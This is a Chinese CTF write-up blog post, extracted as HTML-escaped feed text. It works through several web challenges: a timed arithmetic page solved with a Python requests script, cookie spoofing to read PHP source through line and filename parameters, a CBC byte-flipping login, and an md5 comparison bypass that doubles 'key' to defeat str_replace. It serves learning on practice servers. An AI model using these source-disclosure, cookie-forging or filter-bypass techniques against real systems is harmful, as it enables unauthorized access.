charset="UTF-8"&gt;&lt;/head&gt;&lt;p&gt;亲请在2s内计算老司机的车速是多少&lt;/p&gt;&lt;div&gt;1782911879+706686703-1996813020-984998196*1213520247-1805071043*379299795+1623596400-1052850963+2102818407-2101949215=?;&lt;/div&gt;&lt;style&gt;div,p&#123;text-align: center;margin: 0 auto;&#125;&lt;/style&gt; 两秒之内计算出式子中的值， 再提交 菜鸡还不太会写脚本 参考了dalao们的代码 123456789import requestsimport reurl = 'http://120.24.86.145:8002/qiumingshan/'s = requests.Session()source = s.get(url)expression = re.search(r'(\d+[+\-*])+(\d+)', source.text).group()result = eval(expression)post = &#123;'value': result&#125;print(s.post(url, data = post).text) 不过还是没搞出来。 复习一下requests库 1234567import requests#构造requests对象s = requests.get(url)s.post(url, )#差不多就这些了 cookies欺骗 然而注意到URL中的line和file时就能做出来了。 1234567#用脚本把代码跑出来import requestsa=30for i in range(a): url="http://120.24.86.145:8002/web11/index.php?line="+str(i)+"&amp;filename=aW5kZXgucGhw" s=requests.get(url) print s.text 1234567891011121314151617181920&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; //看这里 $file_list[2]='keys.php'; &#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; 构造cookie就行啦 （然而没搞出flag来） login4 CBC字节翻转攻击 放一张经典的图 据师傅们的wp说是有一个index.php.swp文件存在。 然而没找到， 先把师傅们找到的源码放上来 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;?phpdefine("SECRET_KEY", file_get_contents('/root/key'));define("METHOD", "aes-128-cbc");session_start();function get_random_iv()&#123; $random_iv=''; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie("iv", base64_encode($iv)); setcookie("cipher", base64_encode($cipher));&#125;function check_login()&#123; if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv']))&#123; $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE["iv"]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die("&lt;p&gt;base64_decode('".base64_encode($plain)."') can't unserialize&lt;/p&gt;"); $_SESSION['username'] = $info['username']; &#125;else&#123; die("ERROR!"); &#125; &#125;&#125;function show_homepage()&#123; if ($_SESSION["username"]==='admin')&#123; echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is $flag&lt;/p&gt;'; &#125;else&#123; echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; &#125; echo '&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;';&#125;if(isset($_POST['username']) &amp;&amp; isset($_POST['password']))&#123; $username = (string)$_POST['username']; $password = (string)$_POST['password']; if($username === 'admin')&#123; exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;'); &#125;else&#123; info = array('username'=&gt;username,'password'=&gt;password); login(info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION["username"]))&#123; check_login(); show_homepage(); &#125;else&#123; echo '&lt;body class="login-body"&gt; &lt;div id="wrapper"&gt; &lt;div class="user-icon"&gt;&lt;/div&gt; &lt;div class="pass-icon"&gt;&lt;/div&gt; &lt;form name="login-form" class="login-form" action="" method="post"&gt; &lt;div class="header"&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt; &lt;/div&gt; &lt;div class="content"&gt; &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt; &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt; &lt;/div&gt; &lt;div class="footer"&gt; &lt;input type="submit" name="submit" value="Login" class="button" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;'; &#125;&#125;?&gt;&lt;/html&gt; 备份是个好习惯 根据以前做题的经验， 备份就是在提示你 存在bak文件 所以直接输入URL为 http://123.206.87.240:8002/web16/index.php.bak 然后下载文件 代码： 1234567891011121314&lt;?phpinclude_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."取得flag";&#125;?&gt; 做代码审计的题目， 还是主要靠自己尝试。 1234567891011121314151617181920212223242526&lt;?phperror_reporting(0);$str = strstr($_SERVER['REQUEST_URI'], '?');echo "$str"."&lt;/br&gt;";$str = substr($str, 1);echo "$str"."&lt;/br&gt;";$str = str_replace('key','', $str);echo "$str"."&lt;/br&gt;";parse_str($str);echo "$key1"."&lt;/br&gt;";echo md5($key1);echo "&lt;/br&gt;";echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2) echo 'flag';?&gt; 上面是我用来测试的代码 构造URL为 http://localhost/test/test.php?kkeyey1=1&amp;kkeyey2=2 输出了这些： 123456?kkeyey1=1&amp;kkeyey2=2kkeyey1=1&amp;kkeyey2=2key1=1&amp;key2=21c4ca4238a0b923820dcc509a6f75849bc81e728d9d4c2f636f067f89cc14862c 之前还很疑惑为什么没有get都能得到变量， 原来是parse_str这个函数在起作用。 OK， 现在就是表演的时间了。 参考资料 https://blog.csdn.net/wy_97/article/details/77431111 https://www.cnblogs.com/Pinging/p/8278168.html https://blog.csdn.net/qq_19861715/article/details/79384018 https://blog.csdn.net/qq_39629343/article/details/80696263 秋名山老司机 cookie欺骗 CBC字节翻转攻击 python requests库学习]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
</search>
